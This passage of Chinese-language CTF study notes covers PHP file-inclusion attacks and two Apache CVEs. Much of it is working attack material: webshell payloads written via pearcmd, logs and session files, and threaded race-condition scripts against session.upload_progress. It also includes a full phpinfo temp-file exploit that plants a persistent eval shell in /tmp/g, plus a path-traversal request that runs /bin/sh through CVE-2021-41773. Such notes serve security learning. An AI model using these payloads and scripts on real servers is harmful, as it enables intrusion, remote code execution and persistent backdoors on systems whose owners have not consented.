> ![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712662906464-893e27f2-6149-4c45-a79f-3bc032fe43f4.png)
> 
> 3、file contents：即要添加的压缩的文件的名
> 
> 4、Phar Signature format：即Phar文件的签名，确保文件的完整性，可以是20字节的SHA1，16字节的MD5，32字节的SHA256，64字节的512等
> 
> ![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712662930728-bbb288cb-fe78-49fe-ac71-7b9f14e90896.png)
> 
> [Phar - PHP中文版 - API参考文档](https://www.apiref.com/php-zh/book.phar.html)

---

## 文件包含

### %00/0x00截断

通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节后面的任何内容，如下所示：

`include("languages/../../../../../etc/passwd%00").".php");`

→ `include("languages/../../../../../etc/passwd");`  
注意：%00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。

### /. & /..

当过滤 /etc/passwd 文件。有两种可能的方法可以绕过过滤器。

使用 NullByte `%00` 或 `/.`​

该漏洞将类似于 `http://webapp.thm/index.php?lang=/etc/passwd/.`

我们也可以 `http://webapp.thm/index.php?lang=/etc/passwd%00`

  

> 如果我们在文件系统中使用 `cd ..`，它会让你退后一步;
> 
> 但是，如果你做`cd .`，它会留在当前目录中。
> 
> 同样，如果我们尝试 `/etc/passwd/..`结果是 `/etc/`
> 
> 现在，如果我们尝试 `/etc/passwd/.`，结果将是 `/etc/passwd`，因为 dot 指的是当前目录。

  

### pearcmd

[利用pearcmd进行文件包含](https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#more)

[php裸文件包含](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

[p神博客](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

**条件：**

安装了pear扩展  
php开启了register\_argc\_argv选项

```bash
pear config-create /test /tmp/test.txt
#第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了
#用burp,	hackbar会被url编码
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=@eval($_POST['cmd']);?>+/tmp/test.php
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo();?>+/tmp/1.php
然后蚁剑连接?file=/tmp/test.php
```

### include\_once&require\_once

[绕过require\_once限制](https://cn-sec.com/archives/83909.html)

> Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。

```bash
/proc/self		指向当前进程的/proc/pid/
/proc/self/root/	是指向/的符号链接
/proc/self/root/var/www/html/
/proc/self/cwd是当前进程的工作目录, 指向/var/www/html
/proc/self/root/cwd  cwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录
#绕过：
file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php
```

### 日志包含

原理：

首先需要开启服务器记录日志功能

在不同的系统，存放日志文件地方和文件名不同。当我们请求该服务器页面时，Apache/nginx就会在日志文件内记录下我们的操作，并写到日志文件中。

  

**apache**一般是/var/log/apache/access.log

  

**nginx**的log在/var/log/nginx/access.log和/var/log/nginx/error.log

  

由于访问URL时访问URL时，服务器会对其编码，  
所以得通过**抓包**的形式尝试注入(BS)  
[日志包含漏洞-CSDN博客](https://blog.csdn.net/qq_51553814/article/details/121109276)

  

例：

  

先通过?file=/etc/passwd判断是否存在ssrf漏洞  
因为不管是什么系统，都会在etc目录下存放passwd文件

环境变量地址/proc/1/environ

app/app.py

  

根据提示我们知道是nginx服务器，url:?file=/var/log/nginx/access.log 我们访问日志文件，可以看见回显的都是User-Agent里的信息，通过抓包，在User-Agent里注入，之后再通过日志文件执行注入的语句  
`/?file=/var/log/nginx/access.log&cmd=system('cat /f*');`

### session包含

  

[Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x02-phpinfo)

[session利用的小思路](https://xz.aliyun.com/t/10662)

[利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)

php 5.4后添加了 [session.upload\_progress](https://www.php.net/manual/zh/session.upload-progress.php) 功能，这个功能开启意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，利用这个特性可以将恶意语句写入session文件。

  

p查看 **phpinfo** 内容，定位到 session 相关的信息，标注箭头处是比较关键的信息![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661545202-873e5066-9b9c-47db-b81c-6db0090fac46.png)

  

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1712661545296-aaed0234-8a92-4755-92c1-4f566496a68e.png)

  

注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有**两个以上**的文件上传。

  

> 综上所述，这种利用方式需要满足下面几个条件：
> 
> -   目标环境开启了`session.upload_progress.enable`选项
> -   发送一个文件上传请求，其中包含一个文件表单和一个名字是`PHP_SESSION_UPLOAD_PROGRESS`的字段
> -   请求的Cookie中包含Session ID

  

```python
import io

import requests
import threading  # 多线程

from cffi.backend_ctypes import xrange

sessid = '0'
target = 'https://176fea4b-d65f-44ac-92b0-70f99e9e8bc7.challenge.ctf.show/'
file = 'ph0ebus.txt'  # 上传文件名
f = io.BytesIO(b'a' * 1024 * 50)  # 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长
#f = io.BytesIO(b'GIF89a\n'+b'a' * 1024 * 40)

# data={
#     "1":"<?php file_put_contents('/var/www/html/1.php','<?php eval($_POST[1]);?>')?>"
# }

def write(session):
    while True:
        session.post(target, data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_GET["cmd"]);?>'},
                     files={'file': (file, f)}, cookies={'PHPSESSID': sessid})
            #files={'file': (file, f,'image/png')}

def read(session):
    while True:
        resp = session.post(
            f"{target}/tmp/sess_{sessid}&cmd=system('ls');")
        if file in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+]retry")
            # print(resp.text)

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in xrange(1, 30):  # 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好
            threading.Thread(target=write, args=(session,)).start()
            # target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()
        for i in xrange(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()

--------------------------------------
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/3/7 14:57
# blog: www.wlhhlc.top
import io
import requests
import threading
url = 'https://25f56962-1c83-4cc5-b820-83348026c9b9.challenge.ctf.show/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("ls");?>'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    data = {
        'ctf':'/tmp/sess_flag'
    }
    while True:
        response = session.post(url+'?isVIP=1',data=data)
        print(response.text)
    

if __name__ == '__main__':
    session = requests.session()
    for i in range(30):
        threading.Thread(target=write, args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read, args=(session,)).start()

```

### phpinfo包含

[PHP文件包含漏洞（利用phpinfo）](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md)（先看这个，原理详细还有exp）

[phpinfo函数\_文件包含之通过phpinfo去Getshell@weixin\_39528994](https://blog.csdn.net/weixin_39528994/article/details/111289368)

[文件包含&奇技淫巧@mob604756ebed9f](https://blog.51cto.com/u_15127538/2703368)

```python
# 利用脚本exp.py实现了上述过程，成功包含临时文件后，
#会执行<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>，
#写入一个新的文件/tmp/g，这个文件就会永久留在目标机器上。
# 用python2执行：python exp.py your-ip 8080 100：	
# 可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

### 远程文件包含

include

http://10.10.127.77:8000/host.txt

将host.txt的内容当作代码执行

## 漏洞披露

### CVE-2021-41773(Apache2.4.49/2.4.50)

#### 漏洞条件

1.配置目录遍历,并且开启cgi mode(cgid)

2.Apache HTTPd版本为2.4.49/2.4.50

3.存在cgi-bin和icons文件夹

穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的：<Directory />Require all denied</Directory>）

**注意：**这里的`/icons/`必须是一个存在且可访问的目录

/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/

#### 漏洞利用

burp:

包头修改  
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1

POST 提交  
echo; ls /

### CVE-2017-15715(apache2.4.0~2.4.29)

Apache HTTPD 换行解析漏洞

[Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展_apache_cve-2017-15715-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/108278486)

[Vulhub - Docker-Compose file for vulnerability environment](https://vulhub.org/#/environments/httpd/CVE-2017-15715/)

[利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单 | 离别歌](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)